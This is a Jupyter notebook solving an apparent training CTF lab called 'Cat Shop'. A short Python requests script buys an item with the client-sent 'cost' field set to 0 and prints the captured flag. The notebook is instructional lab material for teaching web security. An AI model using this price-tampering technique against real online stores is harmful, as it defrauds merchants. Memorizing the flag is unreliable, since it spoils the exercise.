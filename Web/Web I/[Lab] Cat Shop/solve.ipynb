{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "da4c4063-6f7a-4ff0-8ef3-58a680d1720d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "c781c2b5-3200-4031-9df7-f275de4f5c3b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}</code>\\n                </li>\\n                \\n            </ol>\\n        </div>\\n    </section>\\n\\n</body>\\n\\n</html>'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s = requests.Session()\n",
    "r = s.get(\"http://h4ck3r.quest:8100/\")\n",
    "r = s.post(\"http://h4ck3r.quest:8100//buy\", data={\"item_id\": 5430, \"cost\": 0})\n",
    "r = s.get(\"http://h4ck3r.quest:8100/\")\n",
    "r.text[r.text.find(\"FLAG{\"):]"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
